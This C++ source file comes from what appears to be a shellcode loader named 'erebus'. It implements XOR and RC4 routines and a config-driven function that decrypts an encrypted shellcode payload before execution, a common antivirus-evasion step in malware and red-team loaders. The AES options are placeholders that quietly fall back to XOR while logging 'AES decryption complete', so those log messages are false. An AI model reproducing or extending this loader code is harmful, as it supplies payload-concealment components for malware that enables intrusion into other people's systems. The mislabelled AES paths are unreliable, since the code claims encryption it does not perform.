#include "../include/loader.hpp"

namespace erebus {
	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
		return;
	}

	VOID DecryptionRC4(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		BYTE S[256];
		BYTE temp;
		
		// KSA (Key Scheduling Algorithm)
		for (int i = 0; i < 256; i++)
			S[i] = i;
		
		int j = 0;
		for (int i = 0; i < 256; i++)
		{
			j = (j + S[i] + Key[i % KeyLen]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
		}
		
		// PRGA (Pseudo-Random Generation Algorithm)
		int i = 0;
		j = 0;
		for (SIZE_T k = 0; k < InputLen; k++)
		{
			i = (i + 1) % 256;
			j = (j + S[i]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
			Input[k] ^= S[(S[i] + S[j]) % 256];
		}
		return;
	}

	VOID DecryptionAES(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		// This is a placeholder for AES decryption using CryptoAPI
		// For a full implementation, you'd need to use BCrypt or CryptoAPI
		LOG_ERROR("AES decryption requires CryptoAPI - using XOR fallback");
		DecryptionXOR(Input, InputLen, Key, KeyLen);
		return;
	}

	// ============================================================
	// CONFIG-BASED DECRYPTION ROUTINE
	// ============================================================
	// Decrypts shellcode based on CONFIG_ENCRYPTION_TYPE setting
	// ============================================================

	VOID DecryptShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
	{
		LOG_INFO("========================================");
		LOG_INFO("Shellcode Decryption (Config-Based)");
		LOG_INFO("========================================");

		// Validate input parameters
		if (!Shellcode || !*Shellcode || !ShellcodeLen || *ShellcodeLen == 0)
		{
			LOG_ERROR("Invalid shellcode pointer or size");
			return;
		}

#if CONFIG_ENCRYPTION_TYPE == 0
		// No encryption
		LOG_INFO("[*] Encryption: NONE - skipping decryption");

#elif CONFIG_ENCRYPTION_TYPE == 1
		// XOR encryption
		{
			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
			SIZE_T keyLen = sizeof(encryptionKey);

			if (keyLen > 0 && encryptionKey[0] != 0x00)
			{
				LOG_INFO("[*] Encryption: XOR");
				LOG_INFO("[+] Key size: %zu bytes", keyLen);
				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
				DecryptionXOR(*Shellcode, *ShellcodeLen, encryptionKey, keyLen);
				LOG_SUCCESS("XOR decryption complete: %zu bytes", *ShellcodeLen);
			}
			else
			{
				LOG_ERROR("XOR encryption configured but key is empty");
			}
		}

#elif CONFIG_ENCRYPTION_TYPE == 2
		// RC4 encryption
		{
			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
			SIZE_T keyLen = sizeof(encryptionKey);

			if (keyLen > 0 && encryptionKey[0] != 0x00)
			{
				LOG_INFO("[*] Encryption: RC4");
				LOG_INFO("[+] Key size: %zu bytes", keyLen);
				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
				DecryptionRC4(*Shellcode, *ShellcodeLen, encryptionKey, keyLen);
				LOG_SUCCESS("RC4 decryption complete: %zu bytes", *ShellcodeLen);
			}
			else
			{
				LOG_ERROR("RC4 encryption configured but key is empty");
			}
		}

#elif CONFIG_ENCRYPTION_TYPE == 3
		// AES-ECB encryption
		{
			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
			SIZE_T keyLen = sizeof(encryptionKey);

			if (keyLen > 0 && encryptionKey[0] != 0x00)
			{
				LOG_INFO("[*] Encryption: AES-ECB");
				LOG_INFO("[+] Key size: %zu bytes", keyLen);
				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
				DecryptionAES(*Shellcode, *ShellcodeLen, encryptionKey, keyLen);
				LOG_SUCCESS("AES-ECB decryption complete: %zu bytes", *ShellcodeLen);
			}
			else
			{
				LOG_ERROR("AES-ECB encryption configured but key is empty");
			}
		}

#elif CONFIG_ENCRYPTION_TYPE == 4
		// AES-CBC encryption (requires IV)
		{
			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
			BYTE encryptionIV[] = CONFIG_ENCRYPTION_IV;
			SIZE_T keyLen = sizeof(encryptionKey);
			SIZE_T ivLen = sizeof(encryptionIV);

			if (keyLen > 0 && encryptionKey[0] != 0x00 && ivLen == 16)
			{
				LOG_INFO("[*] Encryption: AES-CBC");
				LOG_INFO("[+] Key size: %zu bytes", keyLen);
				LOG_INFO("[+] IV size: %zu bytes", ivLen);
				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
				
				// Note: CBC mode decryption would require additional CryptoAPI calls
				// For now, using ECB as fallback
				LOG_ERROR("CBC mode not implemented, using ECB mode instead");
				DecryptionAES(*Shellcode, *ShellcodeLen, encryptionKey, keyLen);
				LOG_SUCCESS("AES decryption complete: %zu bytes", *ShellcodeLen);
			}
			else
			{
				LOG_ERROR("AES-CBC encryption configured but key or IV is invalid");
			}
		}

#else
#error "Invalid CONFIG_ENCRYPTION_TYPE value"
#endif

		LOG_INFO("========================================");
	}
} // namespace erebus
